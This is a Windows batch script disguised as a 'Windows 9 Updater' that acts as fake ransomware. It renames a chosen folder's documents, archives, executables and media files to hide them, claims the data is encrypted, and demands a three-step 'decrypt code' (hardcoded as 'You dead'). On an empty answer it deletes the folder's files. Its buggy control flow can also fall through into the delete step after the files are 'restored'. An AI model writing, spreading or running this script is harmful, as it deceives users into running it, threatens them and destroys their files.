@echo off
title Windows 9 Updater

:start1
set /p encryptLocation=Location :
cls 
cd %encryptLocation%
ren *.zip *.00
ren *.rar *.01
ren *.pdf *.02
ren *.exe *.03
ren *.txt *.04
ren *.xls *.05
ren *.doc *.06
ren *.vcf *.07
ren *.jpg *.08
ren *.Ink *.09
ren *.mp3 *.10
cls
color 4f
echo =============================
echo Your data has been encrypted!
echo =============================
set /p questionbeforedecrypt=Enter Decrypt code (lvl 1/3) :
if "%questionbeforedecrypt%"=="You dead" goto :start 2
set /p questionbeforedecrypt=Enter Decrypt code (lvl 2/3) :
if "%questionbeforedecrypt%"=="You dead" goto :start 2
set /p questionbeforedecrypt=Enter Decrypt code (lvl 3/3) :
if "%questionbeforedecrypt%"=="You dead" goto :start 2
if "%questionbeforedecrypt%"=="" goto :start 3

:start 2
ren *.00 *.zip
ren *.01 *.rar
ren *.02 *.pdf
ren *.03 *.exe
ren *.04 *.txt
ren *.05 *.xls
ren *.06 *.doc
ren *.07 *.vcf
ren *.08 *.jpg
ren *.09 *.Ink
ren *.10 *.mp3
cls
echo ============================
echo Your data has been restored!
echo ============================
pause>nul

:start 3
cd %encryptLocation%
del %encryptLocation%
echo ============================
echo Your data has been deleted!
echo ============================
pause>nul

